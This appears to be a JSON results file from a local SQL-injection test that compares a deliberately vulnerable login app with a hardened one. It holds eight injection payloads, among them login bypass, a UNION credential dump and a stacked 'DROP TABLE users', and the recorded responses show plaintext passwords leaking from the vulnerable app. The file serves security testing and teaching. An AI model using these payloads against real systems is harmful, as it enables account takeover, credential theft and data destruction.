@@ -1,0 +1,579 @@
+{
+  "test_summary": {
+    "timestamp": "2025-11-21T09:56:07.699154",
+    "total_tests": 22,
+    "vulnerable_app_tests": 11,
+    "secure_app_tests": 11
+  },
+  "analysis": {
+    "vulnerable_app": {
+      "total_injections": 8,
+      "successful_injections": 3,
+      "success_rate": 37.5
+    },
+    "secure_app": {
+      "total_injections": 8,
+      "successful_injections": 0,
+      "success_rate": 0.0
+    }
+  },
+  "vulnerable_app_results": [
+    {
+      "test_name": "正常登录 - 有效登录 - admin",
+      "payload": {
+        "username": "admin",
+        "password": "admin123"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:19.949821",
+      "success": true,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = 'admin' AND password = 'admin123'\n    \\n查询结果数量: 1",
+        "message": "登录成功",
+        "success": true,
+        "user_info": {
+          "email": "admin@example.com",
+          "id": 1,
+          "role": "admin",
+          "username": "admin"
+        }
+      },
+      "error": null,
+      "response_time": 2.109,
+      "status_code": 200
+    },
+    {
+      "test_name": "正常登录 - 无效登录 - 错误密码",
+      "payload": {
+        "username": "admin",
+        "password": "wrongpassword"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:22.059388",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = 'admin' AND password = 'wrongpassword'\n    ",
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.052,
+      "status_code": 200
+    },
+    {
+      "test_name": "正常登录 - 无效登录 - 不存在用户",
+      "payload": {
+        "username": "nonexistent",
+        "password": "password"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:24.111765",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = 'nonexistent' AND password = 'password'\n    ",
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.087,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 经典 OR 注入",
+      "payload": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:26.198712",
+      "success": true,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = '' OR 1=1 --' AND password = 'anything'\n    \\n查询结果数量: 7",
+        "message": "登录成功",
+        "success": true,
+        "user_info": [
+          {
+            "email": "admin@example.com",
+            "id": 1,
+            "password": "admin123",
+            "role": "admin",
+            "username": "admin"
+          },
+          {
+            "email": "user@example.com",
+            "id": 2,
+            "password": "user123",
+            "role": "user",
+            "username": "user"
+          },
+          {
+            "email": "test@example.com",
+            "id": 3,
+            "password": "test123",
+            "role": "user",
+            "username": "test"
+          },
+          {
+            "email": "alice@example.com",
+            "id": 4,
+            "password": "alice456",
+            "role": "user",
+            "username": "alice"
+          },
+          {
+            "email": "bob@example.com",
+            "id": 5,
+            "password": "bob789",
+            "role": "user",
+            "username": "bob"
+          },
+          {
+            "email": "manager@example.com",
+            "id": 6,
+            "password": "manager123",
+            "role": "manager",
+            "username": "manager"
+          },
+          {
+            "email": "guest@example.com",
+            "id": 7,
+            "password": "guest123",
+            "role": "guest",
+            "username": "guest"
+          }
+        ]
+      },
+      "error": null,
+      "response_time": 2.082,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 联合查询注入",
+      "payload": {
+        "username": "' UNION SELECT id, username, password, email, role FROM users --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:28.281201",
+      "success": true,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = '' UNION SELECT id, username, password, email, role FROM users --' AND password = 'anything'\n    \\n查询结果数量: 7",
+        "message": "登录成功",
+        "success": true,
+        "user_info": [
+          {
+            "email": "admin@example.com",
+            "id": 1,
+            "password": "admin123",
+            "role": "admin",
+            "username": "admin"
+          },
+          {
+            "email": "user@example.com",
+            "id": 2,
+            "password": "user123",
+            "role": "user",
+            "username": "user"
+          },
+          {
+            "email": "test@example.com",
+            "id": 3,
+            "password": "test123",
+            "role": "user",
+            "username": "test"
+          },
+          {
+            "email": "alice@example.com",
+            "id": 4,
+            "password": "alice456",
+            "role": "user",
+            "username": "alice"
+          },
+          {
+            "email": "bob@example.com",
+            "id": 5,
+            "password": "bob789",
+            "role": "user",
+            "username": "bob"
+          },
+          {
+            "email": "manager@example.com",
+            "id": 6,
+            "password": "manager123",
+            "role": "manager",
+            "username": "manager"
+          },
+          {
+            "email": "guest@example.com",
+            "id": 7,
+            "password": "guest123",
+            "role": "guest",
+            "username": "guest"
+          }
+        ]
+      },
+      "error": null,
+      "response_time": 2.072,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 注释绕过",
+      "payload": {
+        "username": "admin'--",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:30.353743",
+      "success": true,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = 'admin'--' AND password = 'anything'\n    \\n查询结果数量: 1",
+        "message": "登录成功",
+        "success": true,
+        "user_info": {
+          "email": "admin@example.com",
+          "id": 1,
+          "role": "admin",
+          "username": "admin"
+        }
+      },
+      "error": null,
+      "response_time": 2.069,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 双引号注入",
+      "payload": {
+        "username": "\" OR \"1\"=\"1",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:32.423329",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = '\" OR \"1\"=\"1' AND password = 'anything'\n    ",
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.064,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 布尔盲注",
+      "payload": {
+        "username": "' OR '1'='1",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:34.487047",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = '' OR '1'='1' AND password = 'anything'\n    ",
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.063,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 时间盲注",
+      "payload": {
+        "username": "'; WAITFOR DELAY '00:00:05' --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:36.549883",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = ''; WAITFOR DELAY '00:00:05' --' AND password = 'anything'\n    \\n错误: You can only execute one statement at a time.",
+        "message": "数据库错误: You can only execute one statement at a time.",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.071,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 堆叠查询",
+      "payload": {
+        "username": "admin'; DROP TABLE users; --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:38.620619",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = 'admin'; DROP TABLE users; --' AND password = 'anything'\n    \\n错误: You can only execute one statement at a time.",
+        "message": "数据库错误: You can only execute one statement at a time.",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.076,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 错误注入",
+      "payload": {
+        "username": "' AND (SELECT COUNT(*) FROM users) > 0 --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5000/login",
+      "timestamp": "2025-11-21T09:55:40.696446",
+      "success": false,
+      "response_data": {
+        "debug_info": "SQL查询: \n        SELECT id, username, password, email, role \n        FROM users \n        WHERE username = '' AND (SELECT COUNT(*) FROM users) > 0 --' AND password = 'anything'\n    ",
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.08,
+      "status_code": 200
+    }
+  ],
+  "secure_app_results": [
+    {
+      "test_name": "正常登录 - 有效登录 - admin",
+      "payload": {
+        "username": "admin",
+        "password": "admin123"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:44.852946",
+      "success": true,
+      "response_data": {
+        "message": "登录成功",
+        "success": true,
+        "user_info": {
+          "email": "admin@example.com",
+          "id": 1,
+          "role": "admin",
+          "username": "admin"
+        }
+      },
+      "error": null,
+      "response_time": 2.087,
+      "status_code": 200
+    },
+    {
+      "test_name": "正常登录 - 无效登录 - 错误密码",
+      "payload": {
+        "username": "admin",
+        "password": "wrongpassword"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:46.939831",
+      "success": false,
+      "response_data": {
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.076,
+      "status_code": 200
+    },
+    {
+      "test_name": "正常登录 - 无效登录 - 不存在用户",
+      "payload": {
+        "username": "nonexistent",
+        "password": "password"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:49.015749",
+      "success": false,
+      "response_data": {
+        "message": "用户名或密码错误",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.101,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 经典 OR 注入",
+      "payload": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:51.116325",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.071,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 联合查询注入",
+      "payload": {
+        "username": "' UNION SELECT id, username, password, email, role FROM users --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:53.188051",
+      "success": false,
+      "response_data": {
+        "message": "用户名过长",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.061,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 注释绕过",
+      "payload": {
+        "username": "admin'--",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:55.248944",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.117,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 双引号注入",
+      "payload": {
+        "username": "\" OR \"1\"=\"1",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:57.365882",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: \"",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.078,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 布尔盲注",
+      "payload": {
+        "username": "' OR '1'='1",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:55:59.443784",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.084,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 时间盲注",
+      "payload": {
+        "username": "'; WAITFOR DELAY '00:00:05' --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:56:01.528172",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.061,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 堆叠查询",
+      "payload": {
+        "username": "admin'; DROP TABLE users; --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:56:03.589419",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.055,
+      "status_code": 200
+    },
+    {
+      "test_name": "SQL注入 - 错误注入",
+      "payload": {
+        "username": "' AND (SELECT COUNT(*) FROM users) > 0 --",
+        "password": "anything"
+      },
+      "url": "http://localhost:5001/secure-login",
+      "timestamp": "2025-11-21T09:56:05.644639",
+      "success": false,
+      "response_data": {
+        "message": "输入包含不允许的字符: '",
+        "success": false
+      },
+      "error": null,
+      "response_time": 2.053,
+      "status_code": 200
+    }
+  ],
+  "injection_payloads": [
+    {
+      "name": "经典 OR 注入",
+      "username": "' OR 1=1 --",
+      "password": "anything",
+      "description": "绕过登录验证，获取第一个用户信息"
+    },
+    {
+      "name": "联合查询注入",
+      "username": "' UNION SELECT id, username, password, email, role FROM users --",
+      "password": "anything",
+      "description": "尝试获取所有用户信息"
+    },
+    {
+      "name": "注释绕过",
+      "username": "admin'--",
+      "password": "anything",
+      "description": "注释掉密码验证部分"
+    },
+    {
+      "name": "双引号注入",
+      "username": "\" OR \"1\"=\"1",
+      "password": "anything",
+      "description": "使用双引号的 OR 注入"
+    },
+    {
+      "name": "布尔盲注",
+      "username": "' OR '1'='1",
+      "password": "anything",
+      "description": "布尔型盲注攻击"
+    },
+    {
+      "name": "时间盲注",
+      "username": "'; WAITFOR DELAY '00:00:05' --",
+      "password": "anything",
+      "description": "时间延迟注入（SQLServer语法）"
+    },
+    {
+      "name": "堆叠查询",
+      "username": "admin'; DROP TABLE users; --",
+      "password": "anything",
+      "description": "尝试删除用户表"
+    },
+    {
+      "name": "错误注入",
+      "username": "' AND (SELECT COUNT(*) FROM users) > 0 --",
+      "password": "anything",
+      "description": "基于错误的信息泄露"
+    }
+  ]
+}
